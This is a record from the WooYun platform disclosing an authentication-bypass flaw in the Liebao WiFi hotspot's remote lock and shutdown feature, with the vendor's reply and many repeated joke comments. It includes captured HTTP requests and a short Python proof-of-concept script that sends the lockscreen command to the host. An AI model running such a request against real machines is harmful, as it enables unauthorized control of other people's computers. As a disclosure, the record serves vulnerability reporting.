{"id": 45778, "wybug_id": "wooyun-2014-087069", "wybug_title": "猎豹wifi下非认证远程控制电脑关机、锁屏", "wybug_corp": "金山网络", "wybug_author": "路人甲", "wybug_date": "2014-12-14 00:06", "wybug_open_date": "2015-03-14 00:08", "wybug_type": "非授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["认证缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-14：\t细节向公众公开  简要描述： 在电脑开启猎豹WiFi热点，有一项功能是远程控制电脑关机和锁屏，发现认证仅通过mac地址绑定，可通过伪造mac地址绕过认证 详细说明：  \n\nwireshark抓包如下：\nPOST /api/calltool?type=unlockscreen HTTP/1.1 Host: hi.liebao.cn:8735 Connection: keep-alive Content-Length: 0 Origin: http://hi.liebao.cn:8735 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X; zh-CN) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11D257 UCBrowser/10.1.0.518 Mobile Accept: application/json Accept-Language: zh-cn Referer: http://hi.liebao.cn:8735/tool/ Accept-Encoding: gzip,deflate HTTP/1.1 200 OK Transfer-Encoding: chunked C {\"code\":\"1\"} 0 POST /api/calltool?type=lockscreen HTTP/1.1 Host: hi.liebao.cn:8735 Connection: keep-alive Content-Length: 0 Origin: http://hi.liebao.cn:8735 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X; zh-CN) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11D257 UCBrowser/10.1.0.518 Mobile Accept: application/json Accept-Language: zh-cn Referer: http://hi.liebao.cn:8735/tool/ Accept-Encoding: gzip,deflate HTTP/1.1 200 OK Transfer-Encoding: chunked C {\"code\":\"1\"} 0\n可见没有加密，也没有认证。但是设备首次利用该命令时会绑定手机的mac地址通过嗅探合法绑定的手机发送的命令包和mac地址，然后攻击机伪造一样的mac地址和命令包，就可以绕过认证，控制电脑。但是前提是，已经接入了WiFi。   漏洞证明：  \n\n\nimport socket,sysport =8735 #host=\"192.168.191.129\" #223.6.252.25host=\"192.168.191.1\"filename=\"POST /api/calltool?type=lockscreen HTTP/1.1\\r\\nHost: hi.liebao.cn:8735\\r\\nConnection: keep-alive\\r\\nContent-Length: 0\\r\\nOrigin: http://hi.liebao.cn:8735\\r\\nX-Requested-With: XMLHttpRequest\\r\\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X; zh-CN) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/11D257 UCBrowser/10.1.0.518 Mobile\\r\\nAccept: application/json\\r\\nAccept-Language: zh-cn\\r\\nReferer: http://hi.liebao.cn:8735/tool/\\r\\nAccept-Encoding: gzip,deflate\\r\\n\\r\\n\"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((host,port))s.sendall(filename)while 1:    buf=s.recv(2048)    if not len(buf):        break    sys.stdout.write(buf)\n   修复方案：  通过SSL加密，关机和关闭屏幕命令   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-12-15 10:35 厂商回复： 收到，我们将尽快跟进 最新状态： 2014-12-15：该问题为已知问题，想利用该功能首先必须拿到wifi密码接入此wifi。对用户危害较小。后续猎豹WiFi将加入单独权限设置，方便关闭，请关注版本升级  ", "replys": "漏洞评价：\n评论\n     2014-12-14 00:17 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~    \n     2014-12-14 00:38 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  我猜是利用抓包得到的Mac地址    \n     2014-12-14 07:21 |    \t\t小豹 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:8        | 一个人的寂寞，整个群的错234236)\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~    \n     2014-12-14 11:05 |    \t\t腹黑 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:10        | (◦ \"̮ ◦))\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~    \n     2014-12-14 12:55 |    \t\tvace \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | 影子是一个会撒谎的精灵，它在虚空中流浪和...)\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~     \n     2014-12-14 14:16 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~    \n     2014-12-14 14:21 |    \t\tevil \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:21        )\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~    \n     2014-12-14 14:25 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  吓得我马上断开了wifi，吃包卫龙压压惊~    \n     2014-12-14 15:12 |    \t\t耐小心 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:5        | 噗 我是新手 新手求罩)\t\t \n  吓得我马上断开了wifi，吃包卫龙压压惊~    \n     2014-12-14 15:33 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  吓得我马上断开了wifi，吃包卫龙压压惊~    \n     2014-12-14 16:07 |    \t\taaaaty \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:28        | 爱情就像，我问服务器whoami，它说root)\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~    \n     2014-12-14 22:30 |    \t\tCTAA \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:5        | 么么哒)\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~    \n     2014-12-15 12:18 |    \t\t牧者游民 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 砰砰恰 砰砰恰)\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~    \n     2014-12-15 13:06 |    \t\t轨迹 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | 321)\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~    \n     2014-12-15 14:12 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  吓得我马上断开WIFI，吃了包旺旺压惊     \n     2014-12-15 14:50 |    \t\t【|→上善若水】 \t\t\t( 普通白帽子  |\t\t\t        Rank:127 漏洞数:25        | 【|→上善若水】)\t\t \n  吓得我马上断开WIFI，喝了一瓶二锅头压惊    \n     2014-12-15 16:29 |    \t\t蓝翔小王子淫长 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | 屌扳歪！)\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~    \n     2014-12-18 18:52 |    \t\t97_ \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:1        | 新来的小菜鸟)\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~     \n     2014-12-18 19:03 |    \t\t依然 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 进来学习学习，求各位大神保佑)\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~     \n     2014-12-19 09:08 |    \t\tDragons \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 人若无名便可专心练剑，物若无名便可以随意...)\t\t \n  吓得我马上断开了wifi，吃包辣条压压惊~    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}